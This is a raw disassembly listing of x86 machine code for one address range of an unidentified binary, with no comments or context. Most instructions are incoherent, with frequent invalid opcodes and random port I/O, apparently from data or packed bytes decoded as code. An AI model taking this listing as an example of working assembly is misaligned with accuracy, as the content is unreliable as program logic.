  41c012:	cmp    dl,dh
  41c014:	stc    
  41c015:	lahf   
  41c016:	mov    ds:0x185a5c11,eax
  41c01b:	cwde   
  41c01c:	(bad)  
  41c01d:	aam    0xf4
  41c01f:	xchg   esp,eax
  41c020:	xor    bl,dl
  41c022:	jp     0x41c060
  41c024:	loop   0x41bfb5
  41c026:	shr    BYTE PTR [eax],cl
  41c028:	jo     0x41c090
  41c02a:	jnp    0x41c09f
  41c02c:	sti    
  41c02d:	data16 mov ch,BYTE PTR [ebx*1-0x6daa3e97]
  41c035:	test   DWORD PTR [eax],ebx
  41c037:	mov    edi,0x72793102
  41c03c:	or     ch,bh
  41c03e:	adc    edx,DWORD PTR [edi+0x29]
  41c041:	les    esi,FWORD PTR [eax+eax*4]
  41c044:	cmp    BYTE PTR [ecx],dh
  41c046:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c048:	js     0x41c016
  41c04a:	(bad)  
  41c04c:	xlat   BYTE PTR ds:[ebx]
  41c04d:	clc    
  41c04e:	xor    esp,DWORD PTR [ebx-0x7dd93d9a]
  41c054:	pop    ecx
  41c055:	scas   eax,DWORD PTR es:[edi]
  41c056:	shl    DWORD PTR [ebx+0x790b44e2],1
  41c05c:	jp     0x41c017
  41c05e:	(bad)  
  41c05f:	mov    eax,ds:0xbc02a763
  41c064:	sub    eax,DWORD PTR [edi+0x40]
  41c067:	add    ah,bl
  41c069:	and    al,BYTE PTR [ebp+0x56]
  41c06c:	pop    ecx
  41c06d:	sub    eax,0xb5bc8595
  41c072:	call   0xbff7eb5d
  41c077:	dec    edx
  41c078:	mov    ebp,0xc4c9cb07
  41c07d:	adc    eax,0xb76b95f7
  41c082:	hlt    
  41c083:	sub    BYTE PTR [esi-0x34],bl
  41c086:	pusha  
  41c087:	push   ecx
  41c088:	adc    BYTE PTR fs:[ecx],bh
  41c08b:	inc    esi
  41c08c:	mov    al,0xd
  41c08e:	lods   eax,DWORD PTR ds:[esi]
  41c08f:	enter  0xf07c,0x4f
  41c093:	mov    ds:0x405aa2c7,al
  41c098:	inc    esi
  41c099:	push   ebp
  41c09a:	fwait
  41c09b:	add    DWORD PTR [edx-0x5c1f3c2b],esp
  41c0a1:	mov    ch,0xf2
  41c0a3:	outs   dx,BYTE PTR ds:[esi]
  41c0a4:	test   BYTE PTR [eax+ebx*2-0x25],ch
  41c0a8:	test   al,0x39
  41c0aa:	mov    ecx,0xda2d0c3c
  41c0af:	mov    ecx,0x46544d92
  41c0b4:	mov    eax,fs
  41c0b6:	adc    BYTE PTR [edx-0x46],cl
  41c0b9:	xchg   esi,eax
  41c0ba:	add    edx,DWORD PTR [esi-0x5f2768b1]
  41c0c0:	in     eax,dx
  41c0c1:	dec    esp
  41c0c2:	ins    BYTE PTR es:[edi],dx
  41c0c3:	ret    0xebd3
  41c0c6:	cmp    DWORD PTR [ebp-0x3b],esi
  41c0c9:	ins    BYTE PTR es:[edi],dx
  41c0ca:	paddusb mm1,QWORD PTR [ecx+0x1d]
  41c0ce:	clc    
  41c0cf:	add    esi,eax
  41c0d1:	daa    
  41c0d2:	cld    
  41c0d3:	mov    ds:0x11810a04,eax
  41c0d8:	and    al,0xfd
  41c0da:	mov    dh,0x11
  41c0dc:	call   0x10e62c1f
  41c0e1:	mov    bl,0x3f
  41c0e3:	mov    edx,0x8e50a75c
  41c0e8:	(bad)  
  41c0e9:	ror    bh,0x48
  41c0ec:	shr    ebx,0xf8
  41c0ef:	push   edx
  41c0f0:	sub    al,0x1c
  41c0f2:	vpmacssww xmm11,xmm2,xmm3,XMMWORD PTR [ebp+0x2cf66864]
  41c0fc:	mov    DWORD PTR [edi],ebp
  41c0fe:	fwait
  41c0ff:	or     DWORD PTR [ecx],edi
  41c101:	xor    edx,ebp
  41c103:	jle    0x41c0ea
  41c105:	fcomp  QWORD PTR [ebp-0x421a2c8a]
  41c10b:	lods   al,BYTE PTR ds:[esi]
  41c10c:	dec    esp
  41c10d:	push   es
	...
  41c11a:	add    BYTE PTR [ebx],ah
  41c11c:	jno    0x41c193
  41c11e:	push   es
  41c11f:	ja     0x41c127
  41c121:	jae    0x41c198
  41c123:	push   ecx
  41c124:	mov    al,0xe6
  41c126:	retf   0x1de9
  41c129:	push   esp
  41c12a:	bound  edx,QWORD PTR [esi+0x100001e1]
  41c130:	add    al,BYTE PTR [eax]
  41c132:	add    dl,dl
  41c134:	imul   esp,edi,0xffffff84
  41c137:	(bad)  
  41c138:	js     0x41c1b9
  41c13a:	sti    
  41c13b:	mov    edx,0x4a4b2541
  41c140:	push   esi
  41c141:	xor    eax,0xa51e9a4a
  41c146:	adc    al,0xc
  41c148:	adc    al,0xd1
  41c14a:	and    cl,0x24
  41c14d:	in     al,dx
  41c14e:	cmp    al,BYTE PTR [edx-0x4c]
  41c151:	and    DWORD PTR [edx-0x22],0xa70bdc6c
  41c158:	iret   
  41c159:	xchg   ecx,eax
  41c15a:	(bad)  
  41c15b:	outs   dx,DWORD PTR ds:[esi]
  41c15c:	scas   al,BYTE PTR es:[edi]
  41c15d:	out    0x37,eax
  41c15f:	jge    0x41c147
  41c161:	stc    
  41c162:	js     0x41c0ff
  41c164:	int    0x84
  41c166:	pop    edi
  41c167:	sbb    ah,BYTE PTR gs:[edx-0x4a81b19d]
  41c16e:	adc    dh,ch
  41c170:	out    0x30,al
  41c172:	jbe    0x41c186
  41c174:	cmp    ecx,edi
  41c176:	scas   al,BYTE PTR es:[edi]
  41c177:	test   al,0x9a
  41c179:	mov    bl,dh
  41c17b:	inc    eax
  41c17c:	adc    al,0xa6
  41c17e:	test   eax,0x3032c692
  41c183:	aas    
  41c184:	dec    eax
  41c185:	mov    edx,0x42d619c8
  41c18a:	jp     0x41c1a6
  41c18c:	in     eax,dx
  41c18d:	loope  0x41c1ca
  41c18f:	fld    QWORD PTR [ebx-0x53]
  41c192:	mov    ah,0x68
  41c194:	jb     0x41c1d0
  41c196:	mov    edx,0xefb2645a
  41c19b:	fisub  DWORD PTR [eax-0x47d24f46]
  41c1a1:	pushf  
  41c1a2:	adc    DWORD PTR [ecx],eax
  41c1a4:	sbb    ecx,DWORD PTR [edi]
  41c1a6:	out    dx,al
  41c1a7:	cmp    DWORD PTR [ebx+0x73],ecx
  41c1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ab:	lods   eax,DWORD PTR ds:[esi]
  41c1ac:	vpmullw xmm3,xmm6,XMMWORD PTR [ecx+eax*8+0x2e0d24f4]
  41c1b5:	cmp    edx,ecx
  41c1b7:	pop    esi
  41c1b8:	xchg   edx,eax
  41c1b9:	fwait
  41c1ba:	pop    es
  41c1bb:	jl     0x41c21f
  41c1bd:	clc    
  41c1be:	shl    BYTE PTR [eax],cl
  41c1c0:	scas   eax,DWORD PTR es:[edi]
  41c1c1:	push   ebp
  41c1c2:	adc    eax,0xa618b32f
  41c1c7:	rcl    BYTE PTR [edx+0x46],1
  41c1ca:	aaa    
  41c1cb:	xlat   BYTE PTR ds:[ebx]
  41c1cc:	jl     0x41c157
  41c1ce:	jp     0x41c241
  41c1d0:	cs dec ebp
  41c1d2:	mov    BYTE PTR [edi],dh
  41c1d4:	ins    DWORD PTR es:[edi],dx
  41c1d5:	scas   al,BYTE PTR es:[edi]
  41c1d6:	ficomp WORD PTR [esi+0x5e]
  41c1d9:	and    DWORD PTR [eax-0x76014d0f],esi
  41c1df:	in     eax,dx
  41c1e0:	push   eax
  41c1e1:	add    al,0x71
  41c1e3:	addr16 push ebx
  41c1e5:	ins    DWORD PTR es:[edi],dx
  41c1e6:	or     ebp,ecx
  41c1e8:	addr16 (bad) 
  41c1ea:	adc    DWORD PTR [eax-0x4f65a7e],edx
  41c1f0:	ja     0x41c218
  41c1f2:	xor    DWORD PTR [edx],esp
  41c1f4:	dec    esp
  41c1f5:	cdq    
  41c1f6:	(bad)  
  41c1f8:	ja     0x41c1b9
  41c1fa:	cmp    DWORD PTR [edi+ebp*8-0x6d],0x5c
  41c1ff:	ficomp DWORD PTR [edx+0x7e]
  41c202:	ficomp DWORD PTR [ecx]
  41c204:	mov    dh,0x1b
  41c206:	mov    eax,0xeb567d91
  41c20b:	rcr    edi,1
  41c20d:	cmp    eax,0xb0b2fe5a
  41c212:	jp     0x41c26d
  41c214:	sar    bl,0xd9
  41c217:	jns    0x41c1b6
  41c219:	ficom  DWORD PTR [ebx]
  41c21b:	sbb    BYTE PTR [ebx-0x4],0x44
  41c21f:	inc    eax
  41c220:	mov    edi,0xebab8b8c
  41c225:	jle    0x41c29b
  41c227:	das    
  41c228:	push   ecx
  41c229:	xchg   ebp,eax
  41c22a:	cdq    
  41c22b:	(bad)  
  41c22c:	repnz (bad) 
  41c22f:	adc    al,0x55
  41c231:	cmp    DWORD PTR [edx+0x4fc2a73a],esi
  41c237:	out    dx,al
  41c238:	xlat   BYTE PTR ss:[ebx]
  41c23a:	cmp    dl,0x88
  41c23d:	mov    ecx,0xf2c40aaf
  41c242:	mov    bh,0xa2
  41c244:	adc    dh,BYTE PTR [edi-0x3c]
  41c247:	push   cs
  41c248:	enter  0x4056,0x26
  41c24c:	cmc    
  41c24d:	hlt    
  41c24e:	in     al,0x67
  41c250:	sub    al,BYTE PTR ds:0x55cc65b3
  41c256:	dec    ebp
  41c257:	stos   DWORD PTR es:[edi],eax
  41c258:	out    0x6e,al
  41c25a:	dec    edi
  41c25b:	in     al,dx
  41c25c:	pop    esi
  41c25d:	popf   
  41c25e:	pop    edi
  41c25f:	or     DWORD PTR [ecx+0x289453a3],0x2f7e1494
  41c269:	idiv   ebx
  41c26b:	repnz add BYTE PTR [ebp+0x23],bl
  41c26f:	nop
  41c270:	fcomp  DWORD PTR es:[edi+0x2a]
  41c274:	sub    DWORD PTR [ebx+0x49],ebp
  41c277:	ret    0xb16c
  41c27a:	push   edx
  41c27b:	sti    
  41c27c:	pop    ss
  41c27d:	dec    ecx
  41c27e:	(bad)  
  41c27f:	out    0x38,al
  41c281:	or     al,0x3a
  41c283:	in     al,dx
  41c284:	shl    DWORD PTR [edx-0x1637e2f9],0x7
  41c28b:	les    ebx,FWORD PTR [edx-0x2a8e0d4a]
  41c291:	fstp   DWORD PTR [esp+edi*2-0x37]
  41c295:	jg     0x41c23f
  41c297:	mov    bh,0x6c
  41c299:	rcl    BYTE PTR [ebp+edx*1-0x40],1
  41c29d:	jnp    0x41c2a7
  41c29f:	inc    ecx
  41c2a0:	sbb    eax,0x698981ab
  41c2a5:	outs   dx,DWORD PTR ds:[esi]
  41c2a6:	pop    ecx
  41c2a7:	pop    ss
  41c2a8:	and    DWORD PTR [edi],esi
  41c2aa:	push   edi
  41c2ab:	or     BYTE PTR [ebx],bl
  41c2ad:	jp     0x41c28f
  41c2af:	mov    ds:0xb8d9535a,al
  41c2b4:	pop    ebp
  41c2b5:	fistp  WORD PTR [ebx]
  41c2b7:	mov    ?,WORD PTR [esi]
  41c2b9:	xchg   edi,eax
  41c2ba:	cmc    
  41c2bb:	mov    edx,0x42ecd077
  41c2c0:	adc    BYTE PTR [edx],al
  41c2c2:	lds    esi,FWORD PTR [ecx+0x40]
  41c2c5:	and    eax,0x4ef9c8f2
  41c2ca:	jl     0x41c29a
  41c2cc:	xchg   BYTE PTR [edi+0x22],bl
  41c2cf:	fldl2e 
  41c2d1:	mov    ds:0xd5a29bbc,al
  41c2d6:	cmp    ebp,ebx
  41c2d8:	cmp    edi,DWORD PTR [edx+0x3f310406]
  41c2de:	daa    
  41c2df:	push   es
  41c2e0:	mov    cl,0x5a
  41c2e2:	hlt    
  41c2e3:	dec    ecx
  41c2e4:	in     eax,dx
  41c2e5:	(bad)  
  41c2e6:	aad    0x50
  41c2e8:	xchg   esp,eax
  41c2e9:	add    edx,edi
  41c2eb:	(bad)  
  41c2ec:	imul   edx,DWORD PTR [ebx],0xffffffaa
  41c2ef:	cmp    ebx,edx
  41c2f1:	aas    
  41c2f2:	mov    dl,0x96
  41c2f4:	fldenv [edi]
  41c2f6:	cli    
  41c2f7:	jle    0x41c341
  41c2f9:	repnz push cs
  41c2fb:	test   al,0x3e
  41c2fd:	add    ch,dh
  41c2ff:	jmp    0x41c318
  41c301:	mov    cl,0x94
  41c303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c304:	sar    BYTE PTR [ebp+0x68],0x68
  41c308:	mov    edi,0x5299271c
  41c30d:	(bad)  
  41c30e:	rol    BYTE PTR [ebp-0x79ceb277],1
  41c314:	(bad)  
  41c315:	lahf   
  41c316:	fisttp WORD PTR [esi-0x11]
  41c319:	push   eax
  41c31a:	and    eax,edx
  41c31c:	pop    edi
  41c31d:	fstp   TBYTE PTR [edx-0x20cf455e]
  41c323:	cli    
  41c324:	mov    ebx,0xa6c298a6
  41c329:	xchg   DWORD PTR [eax+0x3e851d8e],esp
  41c32f:	cmp    al,0x27
  41c331:	push   edx
  41c332:	mov    ah,0x1d
  41c334:	add    DWORD PTR [eax+0x204e0c17],eax
  41c33a:	loop   0x41c3b3
  41c33c:	mov    esi,0x93e1e0
  41c341:	xchg   ecx,eax
  41c342:	lahf   
	...
  41c34b:	add    al,dh
  41c34d:	inc    edx
  41c34e:	add    BYTE PTR [eax+esi*8],al
  41c351:	inc    edx
  41c352:	add    BYTE PTR [eax],cl
  41c354:	lock inc edx
  41c356:	add    BYTE PTR [eax+esi*8],cl
  41c359:	inc    edx
  41c35a:	add    BYTE PTR [eax],dl
  41c35c:	lock inc edx
  41c35e:	add    BYTE PTR [eax+esi*8],dl
  41c361:	inc    edx
  41c362:	add    BYTE PTR [eax],bl
  41c364:	lock inc edx
  41c366:	add    BYTE PTR [eax+esi*8],bl
  41c369:	inc    edx
  41c36a:	add    BYTE PTR [eax],al
  41c36c:	add    BYTE PTR [ebx+0x0],al
  41c36f:	add    al,0x0
  41c371:	inc    ebx
  41c372:	add    BYTE PTR [eax],cl
  41c374:	add    BYTE PTR [ebx+0x0],al
  41c377:	or     al,0x0
  41c379:	inc    ebx
  41c37a:	add    BYTE PTR [eax],dl
  41c37c:	add    BYTE PTR [ebx+0x0],al
  41c37f:	adc    al,0x0
  41c381:	inc    ebx
  41c382:	add    BYTE PTR [eax],bl
  41c384:	add    BYTE PTR [ebx+0x0],al
  41c387:	sbb    al,0x0
  41c389:	inc    ebx
  41c38a:	add    BYTE PTR [eax],al
  41c38c:	adc    BYTE PTR [ebx+0x0],al
  41c38f:	add    al,0x10
  41c391:	inc    ebx
  41c392:	add    BYTE PTR [eax],cl
  41c394:	adc    BYTE PTR [ebx+0x0],al
  41c397:	or     al,0x10
  41c399:	inc    ebx
  41c39a:	add    BYTE PTR [eax],dl
  41c39c:	adc    BYTE PTR [ebx+0x0],al
  41c39f:	adc    al,0x10
  41c3a1:	inc    ebx
  41c3a2:	add    BYTE PTR [eax],bl
  41c3a4:	adc    BYTE PTR [ebx+0x0],al
  41c3a7:	sbb    al,0x10
  41c3a9:	inc    ebx
  41c3aa:	add    BYTE PTR [eax+ebp*2+0x4e],ah
  41c3ae:	jbe    0x41c3f5
  41c3b0:	push   edi
  41c3b1:	fs dec bx
  41c3b4:	data16 ins BYTE PTR es:[edi],dx
  41c3b6:	inc    ecx
  41c3b7:	pop    ecx
  41c3b8:	inc    ebp
  41c3b9:	outs   dx,BYTE PTR ds:[esi]
  41c3ba:	push   bp
  41c3bc:	dec    esi
  41c3bd:	inc    edi
  41c3be:	dec    ecx
  41c3bf:	pop    edx
  41c3c0:	jno    0x41c40f
  41c3c2:	push   edx
  41c3c3:	push   ecx
  41c3c4:	push   esp
  41c3c5:	push   edx
  41c3c6:	jb     0x41c43f
  41c3c8:	inc    ebx
  41c3c9:	dec    esi
  41c3ca:	push   edi
  41c3cb:	ret    
  41c3cc:	mov    DWORD PTR [ecx+0x0],0x41c7cb
  41c3d3:	adc    eax,esi
  41c3d5:	inc    ecx
  41c3d6:	add    bh,ch
  41c3d8:	or     esi,DWORD PTR [edx+0x324e790e]
  41c3de:	dec    esi
  41c3df:	xchg   DWORD PTR [edi+0x3d],ecx
  41c3e2:	dec    esi
  41c3e3:	scas   eax,DWORD PTR es:[edi]
  41c3e4:	dec    edi
  41c3e5:	cmp    BYTE PTR [esi+0x7a],cl
  41c3e8:	dec    esi
  41c3e9:	cmp    ecx,DWORD PTR [esi-0x62]
  41c3ec:	dec    edi
  41c3ed:	inc    esi
  41c3ee:	dec    esi
  41c3ef:	jae    0x41c43f
  41c3f1:	inc    ecx
  41c3f2:	dec    esi
  41c3f3:	xor    cl,BYTE PTR [esi+0x42]
  41c3f6:	dec    esi
  41c3f7:	pop    esi
  41c3f8:	pop    ebp
  41c3f9:	pop    edi
  41c3fa:	push   edx
  41c3fb:	cmp    DWORD PTR [esi+0x79],ecx
  41c3fe:	dec    esi
  41c3ff:	xor    cl,BYTE PTR [esi-0x79]
  41c402:	dec    edi
  41c403:	cmp    eax,0x384faf4e
  41c408:	dec    esi
  41c409:	jp     0x41c459
  41c40b:	cmp    ecx,DWORD PTR [esi-0x62]
  41c40e:	dec    edi
  41c40f:	inc    esi
  41c410:	dec    esi
  41c411:	mov    DWORD PTR [edi+0x41],ecx
  41c414:	dec    esi
  41c415:	xor    cl,BYTE PTR [esi+0x42]
  41c418:	dec    esi
  41c419:	pop    esi
  41c41a:	ins    DWORD PTR es:[edi],dx
  41c41b:	pop    edi
  41c41c:	bound  edi,QWORD PTR [ecx]
  41c41e:	dec    esi
  41c41f:	jns    0x41c46f
  41c421:	xor    cl,BYTE PTR [esi-0x7e]
  41c424:	dec    edi
  41c425:	cmp    eax,0x394e734e
  41c42a:	dec    esi
  41c42b:	lods   al,BYTE PTR ds:[esi]
  41c42c:	dec    edi
  41c42d:	inc    esp
  41c42e:	dec    esi
  41c42f:	xor    cl,BYTE PTR [esi+0x40]
  41c432:	dec    esi
  41c433:	pop    esi
  41c434:	jge    0x41c495
  41c436:	jb     0x41c4a7
  41c438:	sub    BYTE PTR [eax-0x7d],0x78
  41c43c:	xchg   ebx,eax
  41c43d:	jns    0x41c3cf
  41c43f:	aas    
  41c440:	dec    esi
  41c441:	xchg   BYTE PTR [edi+0x32],cl
  41c444:	dec    esi
  41c445:	xchg   BYTE PTR [edi+0x3e],cl
  41c448:	dec    esi
  41c449:	lods   al,BYTE PTR ds:[esi]
  41c44a:	dec    edi
  41c44b:	cmp    DWORD PTR [esi+0x73],ecx
  41c44e:	dec    esi
  41c44f:	inc    ebp
  41c450:	dec    esi
  41c451:	xor    cl,BYTE PTR [esi+0x46]
  41c454:	dec    esi
  41c455:	pop    esi
  41c456:	lea    ebx,[edi-0x7e]
  41c459:	outs   dx,DWORD PTR ds:[esi]
  41c45a:	xchg   edx,eax
  41c45b:	push   0x79a37893
  41c460:	mov    al,ds:0x4f864e3f
  41c465:	xor    cl,BYTE PTR [esi-0x7a]
  41c468:	dec    edi
  41c469:	ds dec esi
  41c46b:	lods   al,BYTE PTR ds:[esi]
  41c46c:	dec    edi
  41c46d:	cmp    DWORD PTR [esi-0x77],ecx
  41c470:	dec    edi
  41c471:	inc    ebp
  41c472:	dec    esi
  41c473:	xor    cl,BYTE PTR [esi+0x46]
  41c476:	dec    esi
  41c477:	pop    esi
  41c478:	popf   
  41c479:	pop    edi
  41c47a:	xchg   edx,eax
  41c47b:	outs   dx,DWORD PTR ds:[esi]
  41c47c:	mov    ds:0xb378a368,al
  41c481:	jns    0x41c433
  41c483:	aas    
  41c484:	dec    esi
  41c485:	mov    BYTE PTR [edi+0x32],cl
  41c488:	dec    esi
  41c489:	scas   al,BYTE PTR es:[edi]
  41c48a:	dec    edi
  41c48b:	cmp    eax,0x394e734e
  41c490:	dec    esi
  41c491:	mov    eax,ds:0x324e444f
  41c496:	dec    esi
  41c497:	inc    esi
  41c498:	dec    esi
  41c499:	pop    esi
  41c49a:	lods   eax,DWORD PTR ds:[esi]
  41c49b:	pop    edi
  41c49c:	mov    ds:0xb368b26f,al
  41c4a1:	js     0x41c466
  41c4a3:	jns    0x41c465
  41c4a5:	aas    
  41c4a6:	dec    esi
  41c4a7:	mov    BYTE PTR [edi+0x32],cl
  41c4aa:	dec    esi
  41c4ab:	scas   al,BYTE PTR es:[edi]
  41c4ac:	dec    edi
  41c4ad:	cmp    eax,0x394e784e
  41c4b2:	dec    esi
  41c4b3:	lahf   
  41c4b4:	dec    edi
  41c4b5:	cmp    ecx,DWORD PTR [esi+0x32]
  41c4b8:	dec    esi
  41c4b9:	inc    ebp
  41c4ba:	dec    esi
  41c4bb:	pop    esi
  41c4bc:	mov    ebp,0xc26fb25f
  41c4c1:	push   0x79d378c3
  41c4c6:	sar    BYTE PTR [edi],1
  41c4c8:	dec    esi
  41c4c9:	mov    BYTE PTR [edi+0x32],cl
  41c4cc:	dec    esi
  41c4cd:	scas   al,BYTE PTR es:[edi]
  41c4ce:	dec    edi
  41c4cf:	cmp    eax,0x394f824e
  41c4d4:	dec    esi
  41c4d5:	scas   al,BYTE PTR es:[edi]
  41c4d6:	dec    edi
  41c4d7:	inc    esp
  41c4d8:	dec    esi
  41c4d9:	xor    cl,BYTE PTR [esi+0x40]
  41c4dc:	dec    esi
  41c4dd:	pop    esi
  41c4de:	int    0x5f
  41c4e0:	ret    0xd26f
  41c4e3:	push   0x79e378d3
  41c4e8:	loopne 0x41c529
  41c4ea:	dec    esi
  41c4eb:	mov    BYTE PTR [edi+0x32],cl
  41c4ee:	dec    esi
  41c4ef:	scas   al,BYTE PTR es:[edi]
  41c4f0:	dec    edi
  41c4f1:	cmp    eax,0x394f834e
  41c4f6:	dec    esi
  41c4f7:	lods   al,BYTE PTR ds:[esi]
  41c4f8:	dec    edi
  41c4f9:	inc    esp
  41c4fa:	dec    esi
  41c4fb:	xor    cl,BYTE PTR [esi+0x46]
  41c4fe:	dec    esi
  41c4ff:	pop    esi
  41c500:	fstp   QWORD PTR [edi-0x2e]
  41c503:	outs   dx,DWORD PTR ds:[esi]
  41c504:	loop   0x41c56e
  41c506:	jecxz  0x41c580
  41c508:	repz jns 0x41c4fb
  41c50b:	aas    
  41c50c:	dec    esi
  41c50d:	lea    ecx,[edi+0x32]
  41c510:	dec    esi
  41c511:	lahf   
  41c512:	dec    edi
  41c513:	cmp    eax,0x3e4fa24e
  41c518:	dec    esi
  41c519:	xor    cl,BYTE PTR [esi+0x3f]
  41c51c:	dec    esi
  41c51d:	pop    esi
  41c51e:	in     eax,dx
  41c51f:	pop    edi
  41c520:	loop   0x41c591
  41c522:	repnz push 0x790378f3
  41c528:	add    BYTE PTR [eax+0x13],bh
  41c52b:	jns    0x41c53d
  41c52d:	ds dec esi
  41c52f:	jg     0x41c57f
  41c531:	xor    cl,BYTE PTR [esi-0x65]
  41c534:	dec    edi
  41c535:	cmp    al,0x4e
  41c537:	or     BYTE PTR [edi+0x3e],0x4e
  41c53b:	lods   eax,DWORD PTR ds:[esi]
  41c53c:	dec    edi
  41c53d:	cmp    ecx,DWORD PTR [esi+0x32]
  41c540:	dec    esi
  41c541:	inc    ebp
  41c542:	dec    esi
  41c543:	pop    esi
  41c544:	or     eax,0x126f025f
  41c549:	push   0x79237813
  41c54e:	and    BYTE PTR [edi],bh
  41c550:	dec    esi
  41c551:	add    BYTE PTR [eax],al
  41c553:	fcmovnb st,st(3)
  41c555:	inc    ecx
  41c556:	add    bh,cl
  41c558:	lds    eax,FWORD PTR [ecx+0x0]
  41c55b:	xlat   BYTE PTR ds:[ebx]
  41c55c:	lds    eax,FWORD PTR [ecx+0x0]
  41c55f:	iret   
  41c560:	mov    DWORD PTR [ecx+0x0],0x41c73b
  41c567:	mov    edi,0xb70041c7
  41c56c:	lds    eax,FWORD PTR [ecx+0x0]
  41c56f:	mov    ebx,0xbb0041c5
  41c574:	mov    DWORD PTR [ecx+0x0],0x41c61f
  41c57b:	xor    DWORD PTR [ecx-0x45c90764],ebp
  41c581:	pushf  
  41c582:	clc    
  41c583:	rol    ebp,cl
  41c585:	inc    ecx
  41c586:	add    BYTE PTR [edi+0x70041c6],ah
  41c58c:	mov    DWORD PTR [ecx+0x0],0x41c713
  41c593:	and    eax,edi
  41c595:	inc    ecx
  41c596:	add    BYTE PTR [ebx],cl
  41c598:	mov    BYTE PTR [ecx+0x0],0xd7
  41c59c:	ret    
  41c59d:	inc    ecx
  41c59e:	add    BYTE PTR [ebx],ch
  41c5a0:	mov    BYTE PTR [ecx+0x0],0x1b
  41c5a4:	mov    BYTE PTR [ecx+0x0],0xd3
  41c5a8:	mov    DWORD PTR [ecx+0x0],0xf89c85b6
  41c5af:	sbb    eax,0xdf81170b
  41c5b4:	lds    eax,FWORD PTR [ecx+0x0]
  41c5b7:	sbb    BYTE PTR [esi+edx*1],bl
  41c5ba:	or     DWORD PTR [ecx*1+0x705],0x46370040
  41c5c5:	jbe    0x41c606
  41c5c7:	into   
  41c5c8:	fld    DWORD PTR [edx+0x0]
  41c5cb:	arpl   WORD PTR [ecx+edi*2+0x58],si
  41c5cf:	or     al,0xfa
  41c5d1:	jne    0x41c635
  41c5d3:	or     al,0xed
  41c5d5:	inc    BYTE PTR [edi]
  41c5d7:	aas    
  41c5d8:	cli    
  41c5d9:	mov    ds:0x41c5c705,eax
  41c5de:	add    BYTE PTR [ecx-0x4607636b],bh
  41c5e4:	xchg   esi,eax
  41c5e5:	pushf  
  41c5e6:	clc    
  41c5e7:	mov    eax,0xbbf89c95
  41c5ec:	xchg   ebp,eax
  41c5ed:	pushf  
  41c5ee:	clc    
  41c5ef:	mov    edx,0xbdf89c95
  41c5f4:	xchg   ebp,eax
  41c5f5:	pushf  
  41c5f6:	clc    
  41c5f7:	mov    esp,0xbff89c95
  41c5fc:	xchg   ebp,eax
  41c5fd:	pushf  
  41c5fe:	clc    
  41c5ff:	mov    esi,0xa1f89c95
  41c604:	xchg   ebp,eax
  41c605:	pushf  
  41c606:	clc    
  41c607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c608:	xchg   ebp,eax
  41c609:	pushf  
  41c60a:	clc    
  41c60b:	jmp    0x41c3:0xcf6003f9
  41c612:	add    BYTE PTR [eax+eiz*4+0x42],ch
  41c616:	add    BYTE PTR [ecx+0x6c],bh
  41c619:	bound  eax,QWORD PTR [edi-0x4a]
  41c61c:	test   DWORD PTR [eax+edi*8+0x750e91d],ebx
  41c623:	xchg   ebx,eax
  41c624:	or     eax,DWORD PTR [eax]
  41c626:	add    bl,cl
  41c628:	ret    
  41c629:	inc    ecx
  41c62a:	add    BYTE PTR [ebx],bl
  41c62c:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41c65f:	ins    BYTE PTR es:[edi],dx
  41c660:	mov    al,ds:0x85b60042
  41c665:	pushf  
  41c666:	clc    
  41c667:	jbe    0x41c6cf
  41c669:	addr16 push 0x74797566
  41c66f:	imul   esi,DWORD PTR [ebp+0x79],0x6b6c696f
  41c676:	push   0x68
  41c678:	addr16 push 0x6667
  41c67e:	add    BYTE PTR [esi+0x67],ah
  41c681:	imul   bp,WORD PTR [edx+0x6b],0x696f
  41c687:	jne    0x41c6f8
  41c689:	jne    0x41c6fb
  41c68b:	outs   dx,DWORD PTR ds:[esi]
  41c68c:	jne    0x41c6f7
  41c68e:	jo     0x41c6eb
  41c690:	outs   dx,DWORD PTR ds:[esi]
  41c691:	imul   esi,DWORD PTR [ebp+0x69],0x68747975
	...
  41c6a0:	add    BYTE PTR [eax],al
  41c6a2:	add    BYTE PTR [ecx-0x5affbfc8],ch
  41c6a8:	dec    edi
  41c6a9:	lahf   
  41c6aa:	dec    edi
  41c6ab:	lods   al,BYTE PTR ds:[esi]
  41c6ac:	dec    edi
  41c6ad:	mov    al,ds:0xa64f9f4f
  41c6b2:	dec    edi
  41c6b3:	ins    DWORD PTR es:[edi],dx
  41c6b4:	dec    esi
  41c6b5:	ins    BYTE PTR es:[edi],dx
  41c6b6:	dec    esi
  41c6b7:	xor    cl,BYTE PTR [esi+0x0]
  41c6ba:	add    BYTE PTR [edi+0x0],ah
  41c6bd:	data16 add BYTE PTR [eax+eax*1+0x6b],ah
  41c6c2:	add    BYTE PTR [edx+0x0],ch
  41c6c5:	add    BYTE PTR [si+0x0],ch
  41c6c9:	data16 add BYTE PTR [ecx+0x0],ch
  41c6cd:	add    BYTE PTR fs:[edi+0x0],ah
  41c6d1:	imul   eax,DWORD PTR [eax],0x75006f
  41c6d7:	add    BYTE PTR fs:[ecx+0x0],ch
  41c6db:	jae    0x41c6dd
  41c6dd:	outs   dx,DWORD PTR ds:[esi]
  41c6de:	add    BYTE PTR [ebp+0x0],dh
  41c6e1:	add    BYTE PTR [bp+di+0x0],dh
  41c6e5:	data16 add BYTE PTR [ebx+0x0],ch
  41c6e9:	push   0x67006400
  41c6ee:	add    BYTE PTR [edx+0x0],ch
  41c6f1:	imul   eax,DWORD PTR [eax],0x66
  41c6f4:	add    BYTE PTR [eax+eax*1+0x67],ah
  41c6f8:	add    BYTE PTR [esi+0x0],ah
  41c6fb:	add    BYTE PTR fs:[edi+0x0],ah
  41c6ff:	data16 add BYTE PTR [eax+eax*1+0x0],ah
  41c704:	add    BYTE PTR [eax],al
  41c706:	add    BYTE PTR [ecx-0x64b061b1],bl
  41c70c:	dec    edi
  41c70d:	ins    DWORD PTR es:[edi],dx
  41c70e:	dec    esi
  41c70f:	ins    BYTE PTR es:[edi],dx
  41c710:	dec    esi
  41c711:	xor    cl,BYTE PTR [esi-0x51]
  41c714:	dec    edi
  41c715:	lods   eax,DWORD PTR ds:[esi]
  41c716:	dec    edi
  41c717:	lahf   
  41c718:	dec    edi
  41c719:	lods   al,BYTE PTR ds:[esi]
  41c71a:	dec    edi
  41c71b:	ins    DWORD PTR es:[edi],dx
  41c71c:	dec    esi
  41c71d:	ins    BYTE PTR es:[edi],dx
